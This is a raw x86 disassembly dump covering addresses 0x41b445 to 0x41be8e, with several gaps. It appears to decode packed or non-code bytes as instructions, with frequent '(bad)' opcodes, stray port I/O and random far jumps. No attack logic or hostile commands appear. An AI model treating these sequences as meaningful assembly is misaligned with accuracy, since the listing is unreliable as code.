  41b445:	and    ebx,ecx
  41b447:	or     eax,0x4b9329b4
  41b44c:	xchg   edi,esp
  41b44e:	jo     0x41b42e
  41b450:	or     eax,0x847639e2
  41b455:	jo     0x41b4c3
  41b457:	or     DWORD PTR [edx-0x57e014df],esi
  41b45d:	inc    edi
  41b45e:	jae    0x41b452
  41b460:	retf   0xa671
  41b463:	adc    BYTE PTR [ebx+eax*4],0xea
  41b467:	xor    al,0x37
  41b469:	rcpps  xmm2,XMMWORD PTR [edx-0x53]
  41b46d:	lea    eax,[esi+0x44edf9d1]
  41b473:	dec    edx
  41b474:	fld    DWORD PTR [edx+0x1a]
  41b477:	(bad)  
  41b479:	dec    eax
  41b47a:	sub    eax,0x11d7390
  41b47f:	pushf  
  41b480:	mov    edi,0x809de30f
  41b485:	sbb    eax,0xa329b690
  41b48a:	mov    edx,0xb904aeb1
  41b48f:	or     eax,DWORD PTR [ebx]
  41b491:	nop
  41b492:	sub    BYTE PTR [edx+0x6d357b5f],ah
  41b498:	xchg   ecx,esp
  41b49a:	and    al,0x11
  41b49c:	push   eax
  41b49d:	and    eax,0xe4d516fb
  41b4a2:	mov    ebx,0xa803600a
  41b4a7:	inc    DWORD PTR [eax-0x54]
  41b4aa:	pop    eax
  41b4ab:	inc    ebp
  41b4ac:	push   edx
  41b4ad:	cmp    ch,bl
  41b4af:	dec    edi
  41b4b0:	jmp    0x41b505
  41b4b2:	popf   
  41b4b3:	ds je  0x41b4b6
	...
  41b516:	aam    0xec
  41b518:	add    edi,edi
  41b51a:	cmp    edi,edi
  41b51c:	(bad)  
  41b51d:	out    dx,eax
  41b51e:	lock add DWORD PTR [ebp-0x3c],ebp
  41b522:	mov    ebp,0x16cfce8c
  41b527:	and    BYTE PTR [ecx],al
  41b529:	add    BYTE PTR [edi],al
  41b52b:	add    DWORD PTR [eax],eax
  41b52d:	add    BYTE PTR [eax+0x7e],ah
  41b530:	in     eax,dx
  41b531:	mov    cl,0x8a
  41b533:	int    0xfd
  41b535:	mov    cl,0x6f
  41b537:	scas   al,BYTE PTR es:[edi]
  41b538:	loopne 0x41b557
  41b53a:	(bad)  
  41b53b:	sar    bh,cl
  41b53d:	loope  0x41b585
  41b53f:	xor    BYTE PTR [ebx],bh
  41b541:	mov    ds:0x924aee47,eax
  41b546:	mov    al,ds:0xec63da1b
  41b54b:	mov    cl,0x17
  41b54d:	js     0x41b5ce
  41b54f:	push   0x2fc9bc69
  41b554:	xchg   ebp,eax
  41b555:	shl    BYTE PTR [ebx-0x822e7c4],1
  41b55b:	cmp    eax,0xde477389
  41b560:	cmp    al,BYTE PTR [edx]
  41b562:	jmp    0xa6be:0x7f9b3c87
  41b569:	ins    BYTE PTR es:[edi],dx
  41b56a:	inc    ebp
  41b56b:	jne    0x41b5ea
  41b56d:	jbe    0x41b546
  41b56f:	fsubp  st(3),st
  41b571:	adc    ch,BYTE PTR [eax-0x47]
  41b574:	jmp    DWORD PTR [esi]
  41b576:	sub    BYTE PTR [ecx+0x6a5effb9],bh
  41b57c:	ins    DWORD PTR es:[edi],dx
  41b57d:	xchg   ecx,eax
  41b57e:	jle    0x41b551
  41b580:	cmp    dl,dh
  41b582:	sti    
  41b583:	mov    bl,BYTE PTR [ecx+eax*8+0x52]
  41b587:	mov    bl,0x78
  41b589:	test   DWORD PTR [edi],edx
  41b58b:	mov    esi,0x1a2e636e
  41b590:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b591:	scas   al,BYTE PTR es:[edi]
  41b592:	arpl   bx,cx
  41b594:	mov    esp,0x3ddf7e5e
  41b599:	outs   dx,BYTE PTR ds:[esi]
  41b59a:	jns    0x41b545
  41b59c:	mov    ecx,0x1754fd58
  41b5a1:	test   eax,0xc20fbe29
  41b5a6:	loop   0x41b5a3
  41b5a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5a9:	jae    0x41b54a
  41b5ab:	and    ah,BYTE PTR [ebx-0x3b16d694]
  41b5b1:	ds dec ebx
  41b5b3:	add    al,0x7c
  41b5b5:	push   ss
  41b5b6:	jnp    0x41b605
  41b5b8:	xor    BYTE PTR [edx],bl
  41b5ba:	mov    ebx,0x86b8924a
  41b5bf:	popf   
  41b5c0:	cmp    BYTE PTR [ebp-0x2e26f3d0],dl
  41b5c6:	jecxz  0x41b603
  41b5c8:	xchg   edx,eax
  41b5c9:	fidivr DWORD PTR [eiz*4+0x52382a8d]
  41b5d0:	and    ecx,DWORD PTR [ebx+edx*4]
  41b5d3:	lds    esp,FWORD PTR [ecx]
  41b5d5:	adc    ecx,ecx
  41b5d7:	fbld   TBYTE PTR [eax+eiz*1]
  41b5da:	or     eax,0x4228ca03
  41b5df:	adc    eax,0x3012a098
  41b5e4:	neg    DWORD PTR cs:[edi-0x751de904]
  41b5eb:	push   cs
  41b5ec:	mov    esp,0x2cb10418
  41b5f1:	pop    edx
  41b5f2:	jns    0x41b671
  41b5f4:	daa    
  41b5f5:	out    0x88,eax
  41b5f7:	mov    bl,0x6c
  41b5f9:	popf   
  41b5fa:	enter  0x2f4a,0xca
  41b5fe:	enter  0x3eb8,0x60
  41b602:	cmp    DWORD PTR cs:[edx],edx
  41b605:	sub    eax,DWORD PTR [ecx+0x47]
  41b608:	dec    edi
  41b609:	push   ecx
  41b60a:	adc    eax,0xe6bfbcb7
  41b60f:	pop    esi
  41b610:	mov    ah,0x77
  41b612:	into   
  41b613:	and    bl,BYTE PTR [ebx+0x14269285]
  41b619:	mov    WORD PTR [esi-0x6a0c52c9],ss
  41b61f:	out    0xa3,al
  41b621:	xchg   edi,eax
  41b622:	cs js  0x41b65d
  41b625:	pop    ebx
  41b626:	jmp    0x41b635
  41b628:	push   esp
  41b629:	jno    0x41b607
  41b62b:	add    al,0x37
  41b62d:	in     al,dx
  41b62e:	out    dx,eax
  41b62f:	push   ecx
  41b630:	outs   dx,DWORD PTR ds:[esi]
  41b631:	jmp    0xf3b9bb
	...
  41b696:	test   al,0x63
  41b698:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b69e:	cmp    al,0x28
  41b6a0:	rol    BYTE PTR [eax],1
  41b6a2:	xor    DWORD PTR [ecx],0x3f
  41b6a5:	cmp    bl,BYTE PTR ds:0x7000121
  41b6ab:	add    DWORD PTR [eax],eax
  41b6ad:	add    BYTE PTR [ebp+0x2d],cl
  41b6b0:	mov    edx,0xc4760ac9
  41b6b5:	inc    esp
  41b6b6:	mov    ah,0x5a
  41b6b8:	jne    0x41b683
  41b6ba:	sti    
  41b6bb:	mov    ebp,0x9db59c07
  41b6c0:	or     DWORD PTR [edi+0x2c],ebx
  41b6c3:	or     ecx,eax
  41b6c5:	mov    ah,bh
  41b6c7:	mov    ?,WORD PTR [edi-0x36a3180e]
  41b6cd:	cld    
  41b6ce:	stos   BYTE PTR es:[edi],al
  41b6cf:	mov    edi,0x219665e
  41b6d4:	pop    ds
  41b6d5:	pop    ebp
  41b6d6:	push   cs
  41b6d7:	push   eax
  41b6d8:	pop    ds
  41b6d9:	sub    DWORD PTR [eax-0x35],edx
  41b6dc:	enter  0xe838,0x60
  41b6e0:	sub    BYTE PTR [edi],0x4b
  41b6e3:	mov    edi,0xd28b4281
  41b6e8:	push   ecx
  41b6e9:	xchg   ebx,eax
  41b6ea:	ss repnz push ebp
  41b6ed:	out    dx,eax
  41b6ee:	jae    0x41b6bb
  41b6f0:	into   
  41b6f1:	jecxz  0x41b74f
  41b6f3:	scas   eax,DWORD PTR es:[edi]
  41b6f4:	popa   
  41b6f5:	bound  ebp,QWORD PTR [ebp+ebp*8-0xd]
  41b6f9:	addr16 (bad) 
  41b6fb:	lahf   
  41b6fc:	je     0x41b6c1
  41b6fe:	dec    ecx
  41b6ff:	pop    eax
  41b700:	repnz cli 
  41b702:	nop
  41b703:	les    sp,DWORD PTR [ebx+0x5f]
  41b707:	in     al,dx
  41b708:	jbe    0x41b6b6
  41b70a:	mov    WORD PTR ds:0x64209fe4,ds
  41b710:	int3   
  41b711:	jmp    0x41b6c9
  41b713:	add    al,0xe8
  41b715:	mov    cs:0x6372c47f,al
  41b71b:	inc    ebx
  41b71c:	xor    al,0x5
  41b71e:	inc    ebx
  41b71f:	imul   edx,DWORD PTR [esi-0x25875161],0xd
  41b726:	adc    bh,BYTE PTR [ecx+0x8fc29e1]
  41b72c:	idiv   BYTE PTR [edi+0x6034927]
  41b732:	mov    ebx,0xe3b59a7b
  41b737:	jle    0x41b6dc
  41b739:	std    
  41b73a:	xor    eax,0x57235219
  41b73f:	sub    DWORD PTR [edx+ecx*2-0x6c047817],ebp
  41b746:	shr    DWORD PTR [ebx-0x5a],cl
  41b749:	iret   
  41b74a:	xchg   edx,eax
  41b74b:	xchg   edx,eax
  41b74c:	cmp    BYTE PTR [edx+0x84b4262],dl
  41b752:	pop    edi
  41b753:	cmp    dl,cl
  41b755:	cs jp  0x41b742
  41b758:	cli    
  41b759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b75a:	sar    al,cl
  41b75c:	add    DWORD PTR [ecx],esp
  41b75e:	dec    edx
  41b75f:	out    dx,al
  41b760:	stos   DWORD PTR es:[edi],eax
  41b761:	mov    WORD PTR [eax],es
  41b763:	pop    ds
  41b764:	ins    BYTE PTR es:[edi],dx
  41b765:	arpl   WORD PTR [esp+ecx*2],cx
  41b768:	nop
  41b769:	call   0xe4324d9f
  41b76e:	xor    BYTE PTR [ecx],0x63
  41b771:	inc    BYTE PTR [edi]
  41b773:	cmp    eax,DWORD PTR [eax+ecx*2-0x2233d982]
  41b77a:	cld    
  41b77b:	sbb    dl,BYTE PTR [edi+0x65]
  41b77e:	sahf   
  41b77f:	stc    
  41b780:	js     0x41b7ef
  41b782:	or     BYTE PTR [ecx-0x79c4c8ee],dh
  41b788:	inc    ebp
  41b789:	loope  0x41b738
  41b78b:	repz in eax,0x77
  41b78e:	dec    ah
  41b790:	pop    ebp
  41b791:	xor    BYTE PTR [edi+0x6c],ah
  41b794:	mov    ds:0xc9d28e67,al
  41b799:	mov    ?,WORD PTR [edx]
  41b79b:	jnp    0x41b7a8
  41b79d:	pop    edx
  41b79e:	pop    ebp
  41b79f:	push   edx
  41b7a0:	add    esi,edi
  41b7a2:	push   ebp
  41b7a3:	jl     0x41b7f8
  41b7a5:	mov    BYTE PTR [ecx+esi*2],dl
  41b7a8:	push   ebp
  41b7a9:	popf   
  41b7aa:	lock pop eax
  41b7ac:	push   0x14
  41b7ae:	dec    esp
  41b7af:	xor    cl,BYTE PTR [eax+ecx*1]
  41b7b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7b3:	fadd   DWORD PTR ds:0x0
	...
  41b815:	add    BYTE PTR [edx-0x8b13804],cl
  41b81b:	jg     0x41b7a8
  41b81d:	cld    
  41b81e:	fcmovbe st,st(0)
  41b820:	(bad)  
  41b821:	out    0x9e,al
  41b823:	js     0x41b856
  41b825:	dec    ecx
  41b826:	and    al,0x22
  41b828:	add    DWORD PTR [eax],eax
  41b82a:	pop    es
  41b82b:	add    DWORD PTR [eax],eax
  41b82d:	add    BYTE PTR [eax+0x337291d0],ch
  41b833:	sar    bh,0xa
  41b836:	adc    eax,0xee4c276f
  41b83b:	inc    ecx
  41b83c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b83d:	lock mov dh,0xa0
  41b840:	sub    ebp,0x1156c590
  41b846:	cmp    cl,BYTE PTR [ecx+0x50ae22d9]
  41b84c:	mov    edi,0xd0de7d50
  41b851:	pop    edx
  41b852:	cmp    BYTE PTR [edi+0xb],bl
  41b855:	les    edx,FWORD PTR [eax+0x1a9cc469]
  41b85b:	out    dx,al
  41b85c:	cs js  0x41b88e
  41b85f:	xor    edi,DWORD PTR [ebp-0x1e8edeb3]
  41b865:	adc    BYTE PTR [ebp-0x40],cl
  41b868:	cmp    al,al
  41b86a:	stc    
  41b86b:	into   
  41b86c:	scas   al,BYTE PTR es:[edi]
  41b86d:	sbb    BYTE PTR [esi-0x19],bh
  41b870:	sbb    DWORD PTR [ebx+0x1cafc3fc],esi
  41b876:	or     esp,DWORD PTR ds:0x10465184
  41b87c:	push   cs
  41b87d:	adc    dh,BYTE PTR [ebp-0x79]
  41b880:	popa   
  41b881:	fsub   DWORD PTR [edi-0x1f]
  41b884:	xchg   esp,eax
  41b885:	outs   dx,BYTE PTR ds:[esi]
  41b886:	inc    ebx
  41b887:	aas    
  41b888:	add    al,0xbc
  41b88a:	js     0x41b88e
  41b88c:	pop    ebx
  41b88d:	in     al,0xf0
  41b88f:	cmp    al,0xcb
  41b891:	loopne 0x41b889
  41b893:	dec    eax
  41b894:	cmp    BYTE PTR [edi+0x27],0xaa
  41b898:	push   eax
  41b899:	data16 mov WORD PTR [eax],?
  41b89c:	cs inc edx
  41b89e:	inc    ebp
  41b89f:	dec    edi
  41b8a0:	pop    ebp
  41b8a1:	(bad)  
  41b8a2:	les    edx,FWORD PTR [ebp+0x2c730418]
  41b8a8:	jno    0x41b88c
  41b8aa:	push   edi
  41b8ab:	add    ebx,edi
  41b8ad:	mov    ecx,0xc331b12a
  41b8b2:	and    cl,BYTE PTR [esi-0xf]
  41b8b5:	cwde   
  41b8b6:	call   0x4d0ff00b
  41b8bb:	dec    ebx
  41b8bc:	sub    al,BYTE PTR [ecx+eiz*4-0x7a]
  41b8c0:	or     BYTE PTR [ebp-0x20eaa0b1],ch
  41b8c6:	push   ecx
  41b8c7:	loopne 0x41b8ad
  41b8c9:	inc    edx
  41b8ca:	and    esp,esp
  41b8cc:	aam    0x88
  41b8ce:	add    ch,BYTE PTR [eax]
  41b8d0:	popa   
  41b8d1:	ss jmp 0x81af7952
  41b8d7:	popf   
  41b8d8:	outs   dx,BYTE PTR ds:[esi]
  41b8d9:	sar    BYTE PTR [ebx-0x1f],cl
  41b8dc:	je     0x41b8df
  41b8de:	jp     0x41b90d
  41b8e0:	jno    0x41b8a5
  41b8e2:	fsubr  QWORD PTR [eax]
  41b8e4:	out    dx,al
  41b8e5:	pop    edi
  41b8e6:	push   ss
  41b8e7:	mov    bh,0x7b
  41b8e9:	or     DWORD PTR [edi*8-0x5f1da831],edx
  41b8f0:	and    eax,0xf6f26802
  41b8f5:	sub    ecx,DWORD PTR [ebp-0x46]
  41b8f8:	xor    dl,0x61
  41b8fb:	sbb    DWORD PTR [edi-0x5901e5c0],ebx
  41b901:	and    eax,0x996de56d
  41b906:	mov    ds:0x93919644,eax
  41b90b:	sbb    BYTE PTR [ebp-0x7b],dh
  41b90e:	je     0x41b964
  41b910:	xchg   ecx,eax
  41b911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b912:	div    DWORD PTR [edx+ebx*2]
  41b915:	lea    eax,[ecx]
  41b917:	test   DWORD PTR [ebp-0x19d7e318],ebx
  41b91d:	mov    ch,0x80
  41b91f:	cdq    
  41b920:	cmp    DWORD PTR [ebp+0x74],ebx
  41b923:	add    BYTE PTR [ebp+0x571b0e43],bh
  41b929:	dec    edi
  41b92a:	sub    eax,0xa2282ab4
  41b92f:	sbb    eax,0x77e7a516
  41b934:	cmp    al,BYTE PTR [eax]
	...
  41b996:	ret    
  41b997:	mov    esp,0xf87f4844
  41b99c:	iret   
  41b99d:	mov    edi,0x51d578ae
  41b9a2:	xchg   ecx,eax
  41b9a3:	inc    esi
  41b9a4:	mov    esi,0x1232b03
  41b9a9:	add    BYTE PTR [edi],al
  41b9ab:	add    DWORD PTR [eax],eax
  41b9ad:	add    BYTE PTR [ebp+0x30],dh
  41b9b0:	add    bl,bh
  41b9b2:	jo     0x41b951
  41b9b4:	dec    ebp
  41b9b5:	add    BYTE PTR [esi+0x7e],dh
  41b9b8:	and    dl,bl
  41b9ba:	mov    dl,0xf3
  41b9bc:	test   eax,0xd2950c5c
  41b9c1:	test   edx,esp
  41b9c3:	adc    dl,dl
  41b9c5:	in     eax,dx
  41b9c6:	xchg   ebp,eax
  41b9c7:	push   esp
  41b9c8:	scas   al,BYTE PTR es:[edi]
  41b9c9:	and    BYTE PTR [edi+0x2f],dl
  41b9cc:	scas   eax,DWORD PTR es:[edi]
  41b9cd:	jge    0x41b9e2
  41b9cf:	mov    al,ds:0x7a8fbf17
  41b9d4:	outs   dx,DWORD PTR ds:[esi]
  41b9d5:	adc    ah,BYTE PTR [esi-0x12]
  41b9d8:	imul   edx,DWORD PTR [edi+0x56f7af85],0xffffff87
  41b9df:	aas    
  41b9e0:	mov    ch,0x68
  41b9e2:	mov    BYTE PTR [edi+0x55d9230a],al
  41b9e8:	xchg   ebx,eax
  41b9ea:	add    DWORD PTR [ebx],edx
  41b9ec:	jge    0x41b97f
  41b9ee:	mov    ds:0xd18775e2,al
  41b9f3:	dec    esi
  41b9f4:	ret    0x1788
  41b9f7:	sub    eax,0x234e4fce
  41b9fc:	test   BYTE PTR [ebx+0x13415eab],0xc8
  41ba03:	(bad)  
  41ba04:	mov    edi,0x7d662c7c
  41ba09:	arpl   WORD PTR [ebx-0x31a7ea2f],ax
  41ba0f:	dec    DWORD PTR [ebp+0x46]
  41ba12:	cmp    ch,ah
  41ba14:	and    dl,BYTE PTR ds:0x3a83bcda
  41ba1a:	rcr    al,1
  41ba1c:	dec    esp
  41ba1d:	xchg   ecx,eax
  41ba1e:	xchg   edx,eax
  41ba1f:	mov    esp,0x5669355b
  41ba24:	fisttp WORD PTR [edi+0x7e3b7d9]
  41ba2a:	js     0x41b9ca
  41ba2c:	je     0x41ba61
  41ba2e:	ss mov dl,0x79
  41ba31:	ds mov ah,0xbf
  41ba34:	repz adc edi,edi
  41ba37:	arpl   WORD PTR [ebp+0x3a],di
  41ba3a:	cmp    dh,al
  41ba3c:	rol    cl,0x44
  41ba3f:	jnp    0x41ba1c
  41ba41:	sbb    eax,0x6698a5f7
  41ba46:	jle    0x41ba75
  41ba48:	or     BYTE PTR [eax+0xe1cdf75],dh
  41ba4e:	test   eax,0xda2a95c8
  41ba53:	sub    BYTE PTR [esp+edx*8],bh
  41ba56:	lock popf 
  41ba58:	lea    ebx,[esi]
  41ba5a:	fldcw  WORD PTR [edi+esi*2+0x69]
  41ba5e:	adc    DWORD PTR [edi],esp
  41ba60:	jo     0x41ba6e
  41ba62:	ficomp WORD PTR [ecx-0x4e]
  41ba65:	mov    esp,0xc1ec0759
  41ba6a:	sbb    dh,BYTE PTR [eax+edx*1-0x3ac0c62b]
  41ba71:	movd   DWORD PTR [eax+eax*4],mm6
  41ba75:	(bad)  
  41ba76:	mov    ds:0xa2fa8901,al
  41ba7b:	clc    
  41ba7c:	dec    esp
  41ba7d:	mov    ecx,0x1b8f3e9e
  41ba82:	dec    edx
  41ba83:	dec    ecx
  41ba84:	mov    eax,ds:0x35043cb9
  41ba89:	clc    
  41ba8a:	fimul  DWORD PTR [eax+0x7]
  41ba8d:	in     al,dx
  41ba8e:	inc    eax
  41ba8f:	pusha  
  41ba90:	dec    ecx
  41ba91:	cmp    eax,0xe7f37ed6
  41ba96:	add    eax,0x8243c4aa
  41ba9b:	in     al,0x8f
  41ba9d:	adc    BYTE PTR [ecx+ebx*2+0x1edce4f4],ch
  41baa4:	pop    ds
  41baa5:	sbb    eax,0x82a1119c
  41baaa:	std    
  41baab:	aam    0x74
  41baad:	jp     0x41bab2
  41baaf:	sub    BYTE PTR [edx],al
  41bab1:	xor    dh,BYTE PTR [edi+0x5c63]
	...
  41bb13:	add    BYTE PTR [eax],al
  41bb15:	add    BYTE PTR [edx],cl
  41bb17:	mov    eax,0xbfb7aaa5
  41bb1c:	(bad)  
  41bb1e:	lahf   
  41bb1f:	and    esp,DWORD PTR [ebx-0x56]
  41bb22:	call   0x124:0x32508ecb
  41bb29:	add    BYTE PTR [edi],al
  41bb2b:	add    DWORD PTR [eax],eax
  41bb2d:	add    BYTE PTR [eax],dh
  41bb2f:	mov    esp,0xa0f7d918
  41bb34:	push   cs
  41bb35:	mov    ds:0xefb0d00b,eax
  41bb3a:	js     0x41bb22
  41bb3c:	mov    eax,0x38d10071
  41bb41:	repnz ficomp DWORD PTR [esi-0x31]
  41bb45:	std    
  41bb46:	stc    
  41bb47:	xor    bl,BYTE PTR ds:0x526e7107
  41bb4d:	call   0xad2e:0x234e6d1f
  41bb54:	addr16 jle 0x41bb2f
  41bb57:	js     0x41baf7
  41bb59:	sub    ch,BYTE PTR [esi+eax*4+0x2a]
  41bb5d:	jns    0x41bb4e
  41bb5f:	enter  0x1e9b,0xf4
  41bb63:	lea    esi,[ebx-0x5bf9d50b]
  41bb69:	repz cmp al,bh
  41bb6c:	and    ch,BYTE PTR [ebx-0x2]
  41bb6f:	cmp    dl,dh
  41bb71:	pushf  
  41bb72:	jp     0x41bba0
  41bb74:	cli    
  41bb75:	ja     0x41bb41
  41bb77:	pop    edx
  41bb78:	dec    ecx
  41bb79:	sbb    ah,BYTE PTR [ecx-0x4a8333c9]
  41bb7f:	inc    edi
  41bb80:	sbb    DWORD PTR [esp+eiz*2+0x756cc500],edx
  41bb87:	out    0xe8,eax
  41bb89:	mov    edi,0x397aa2eb
  41bb8e:	or     eax,0xa34812e3
  41bb93:	ror    DWORD PTR [ebp+0x4f],cl
  41bb96:	test   eax,0x1c4eafd3
  41bb9b:	xor    eax,DWORD PTR [ecx-0x3f]
  41bb9e:	push   ds
  41bb9f:	ret    
  41bba0:	jno    0x41bb7f
  41bba2:	hlt    
  41bba3:	sub    eax,0xa6db51c3
  41bba8:	sbb    al,0xea
  41bbaa:	int3   
  41bbab:	jl     0x41bba3
  41bbad:	shl    DWORD PTR [edi],0x76
  41bbb0:	retf   0xcada
  41bbb3:	lds    edi,FWORD PTR [ebx-0x47]
  41bbb6:	mov    esi,0xb97755ab
  41bbbb:	fst    QWORD PTR [edi+ebp*4]
  41bbbe:	ja     0x41bb55
  41bbc0:	push   ecx
  41bbc1:	inc    esp
  41bbc2:	stc    
  41bbc3:	pop    ebp
  41bbc4:	(bad)  
  41bbc5:	adc    ah,BYTE PTR [ebx+ecx*1-0x56]
  41bbc9:	xchg   BYTE PTR [ecx-0x28],al
  41bbcc:	sub    al,0x6b
  41bbce:	mov    esp,0x3dbb1410
  41bbd3:	xor    BYTE PTR [eax+eax*4],0x68
  41bbd7:	adc    DWORD PTR [edx-0x155effea],edi
  41bbdd:	int    0x69
  41bbdf:	push   0x296bbf5b
  41bbe4:	outs   dx,BYTE PTR ds:[esi]
  41bbe5:	fdiv   st,st(2)
  41bbe7:	fcmovnb st,st(3)
  41bbe9:	cmp    BYTE PTR [edx+0x2a],bh
  41bbec:	dec    edi
  41bbed:	inc    ax
  41bbef:	jmp    0x1e77:0x7fc7d6a1
  41bbf6:	leave  
  41bbf7:	pop    esi
  41bbf8:	add    DWORD PTR [eax],ebp
  41bbfa:	jne    0x41bc33
  41bbfc:	sub    DWORD PTR [ecx],ebp
  41bbfe:	mov    bh,0x5b
  41bc00:	fdivr  DWORD PTR [ecx+0x47dadee6]
  41bc06:	xlat   BYTE PTR ds:[ebx]
  41bc07:	rcr    DWORD PTR [edx+0x1c48632d],1
  41bc0d:	and    BYTE PTR [edx],ch
  41bc0f:	push   edx
  41bc10:	dec    ebp
  41bc11:	aam    0x7a
  41bc13:	loope  0x41bb95
  41bc15:	xchg   ecx,eax
  41bc16:	adc    al,0x1a
  41bc18:	repnz sub al,0x86
  41bc1b:	jb     0x41bbd5
  41bc1d:	out    0xa7,al
  41bc1f:	or     BYTE PTR es:[edi+0x58],dl
  41bc23:	(bad)  
  41bc24:	js     0x41bc7b
  41bc26:	sub    al,BYTE PTR [ebp+0x53]
  41bc29:	xor    al,0x6a
  41bc2b:	xchg   BYTE PTR [ebx],cl
  41bc2d:	sbb    edx,0xbb286517
  41bc33:	dec    eax
  41bc34:	or     eax,0x0
	...
  41bc95:	add    dl,dl
  41bc97:	xor    bh,dl
  41bc99:	clc    
  41bc9a:	cli    
  41bc9b:	clc    
  41bc9c:	sar    BYTE PTR [edx],cl
  41bc9e:	js     0x4118248d
  41bca4:	ins    DWORD PTR es:[edi],dx
  41bca5:	mov    esp,0x12539
  41bcaa:	pop    es
  41bcab:	add    DWORD PTR [eax],eax
  41bcad:	add    BYTE PTR [ebp+0x694c747f],bl
  41bcb3:	mov    esp,0xe18a3512
  41bcb8:	xchg   ecx,eax
  41bcb9:	lods   eax,DWORD PTR ds:[esi]
  41bcba:	add    DWORD PTR [ebx-0x4c],edi
  41bcbd:	xor    al,0x5
  41bcbf:	add    dl,BYTE PTR ds:0xfe7e21d7
  41bcc5:	mov    dl,0x33
  41bcc7:	data16 sar BYTE PTR [eax+0x5a],1
  41bccb:	sub    esp,DWORD PTR [ecx+0x35c526c]
  41bcd1:	bound  ecx,QWORD PTR [eax+0x5ccdddac]
  41bcd7:	sbb    ebx,DWORD PTR [esi]
  41bcd9:	das    
  41bcda:	inc    ebp
  41bcdb:	(bad)  
  41bcdc:	push   edx
  41bcdd:	sbb    DWORD PTR [eax],eax
  41bcdf:	xlat   BYTE PTR ds:[ebx]
  41bce0:	jbe    0x41bd45
  41bce2:	sbb    BYTE PTR [eax],ch
  41bce4:	lods   al,BYTE PTR es:[esi]
  41bce6:	rcr    bh,cl
  41bce8:	mov    ah,0xa5
  41bcea:	rcr    BYTE PTR [ecx],cl
  41bcec:	pop    ecx
  41bced:	fisub  WORD PTR [eax]
  41bcef:	stos   DWORD PTR es:[edi],eax
  41bcf0:	xchg   esp,eax
  41bcf1:	jnp    0x41bd45
  41bcf3:	inc    edx
  41bcf4:	pop    esp
  41bcf5:	aaa    
  41bcf6:	add    edx,DWORD PTR [esi-0x24]
  41bcf9:	or     al,0x49
  41bcfb:	nop
  41bcfc:	add    ebx,DWORD PTR [edi+0x1f15b34a]
  41bd02:	sub    cl,ah
  41bd04:	and    DWORD PTR [esi+0x2],esp
  41bd07:	sub    bh,cl
  41bd09:	(bad)  
  41bd0a:	xor    eax,0x79fe923f
  41bd0f:	sub    eax,0xa4129c95
  41bd14:	iret   
  41bd15:	push   0xc541608f
  41bd1a:	sbb    al,BYTE PTR [edx]
  41bd1c:	repnz cli 
  41bd1e:	call   0xd19d:0xa176d4e3
  41bd25:	jp     0x41bd0e
  41bd27:	cmp    dl,BYTE PTR [ecx+edi*1+0x6a0fd101]
  41bd2e:	sub    al,0x7a
  41bd30:	retf   
  41bd31:	in     eax,0xf0
  41bd33:	adc    DWORD PTR [edi-0x68a304e3],0x3ba2c6c0
  41bd3d:	or     dh,BYTE PTR [ebx+0x13b7714e]
  41bd43:	leave  
  41bd44:	pop    eax
  41bd45:	scas   al,BYTE PTR es:[edi]
  41bd46:	push   edx
  41bd47:	repnz mov esi,0x29cc7d0c
  41bd4d:	xchg   ebp,eax
  41bd4e:	jne    0x41bd80
  41bd50:	mov    eax,ds:0x1f86e7c3
  41bd55:	(bad)  
  41bd56:	in     eax,0x16
  41bd58:	mov    ebp,0x91576694
  41bd5d:	cmp    BYTE PTR [ebp-0x1610029],dh
  41bd63:	sub    ah,BYTE PTR [eax-0x6bcf03b5]
  41bd69:	pushf  
  41bd6a:	jg     0x41bd7e
  41bd6c:	adc    BYTE PTR [esi-0x691f0af7],dh
  41bd72:	fs push es
  41bd74:	jne    0x41bd80
  41bd76:	and    ebx,edx
  41bd78:	xor    BYTE PTR [ebx+0x3733c002],bl
  41bd7e:	fcmovne st,st(1)
  41bd80:	push   ebx
  41bd81:	mov    bl,0xf5
  41bd83:	ss sub eax,0xbbbf1475
  41bd89:	adc    DWORD PTR [eax-0xba59295],eax
  41bd8f:	inc    esi
  41bd90:	mov    DWORD PTR [eax+0x3929aaca],edi
  41bd96:	rcl    BYTE PTR [eax-0x80f5756],1
  41bd9c:	pop    ecx
  41bd9d:	(bad)  
  41bd9e:	cdq    
  41bd9f:	pop    edx
  41bda0:	add    dl,al
  41bda2:	and    eax,0xd3d7a3d5
  41bda7:	mov    eax,ds:0x1e94551f
  41bdac:	std    
  41bdad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdae:	and    al,BYTE PTR [esp+ebp*1+0x34]
  41bdb2:	pop    esi
  41bdb3:	bound  edx,QWORD PTR [ebp+0x0]
	...
  41be16:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be1c:	imul   edi
  41be1e:	add    BYTE PTR [ebp-0x32],dh
  41be21:	push   edx
  41be22:	xor    ebx,ebx
  41be24:	(bad)  
  41be25:	mov    al,0x40
  41be27:	add    DWORD PTR es:[eax],eax
  41be2a:	pop    es
  41be2b:	add    DWORD PTR [eax],eax
  41be2d:	add    ch,dl
  41be2f:	jbe    0x41bde2
  41be31:	cld    
  41be32:	or     ebp,ecx
  41be34:	or     bh,BYTE PTR [edx]
  41be36:	dec    ebp
  41be37:	jmp    0x17cd:0x55d7aca3
  41be3e:	loopne 0x41bdcc
  41be40:	ds fxch st(2)
  41be43:	mov    edi,0x91a35160
  41be48:	lds    ebx,FWORD PTR [esp+ebp*8+0x4e]
  41be4c:	and    bh,BYTE PTR [edi-0x1d6e8811]
  41be52:	jge    0x41be43
  41be54:	std    
  41be55:	jmp    0xd28ed38e
  41be5a:	jmp    0x41bde0
  41be5c:	test   eax,0xe822959
  41be61:	lods   eax,DWORD PTR ds:[esi]
  41be62:	les    ecx,FWORD PTR [ebx]
  41be64:	lds    eax,FWORD PTR ds:0x5094abcf
  41be6a:	gs xchg edi,eax
  41be6c:	push   0x81dcf6c6
  41be71:	sbb    dl,dh
  41be73:	test   BYTE PTR [edi],0xb2
  41be76:	mov    edx,0xdaa9ad34
  41be7b:	jb     0x41be51
  41be7d:	lds    ecx,FWORD PTR [ebp+0x55]
  41be80:	repz cmp eax,0x8754bee8
  41be86:	mov    al,ds:0xffcf4bbc
  41be8b:	es or  al,cl
  41be8e:	shl    ebx,1
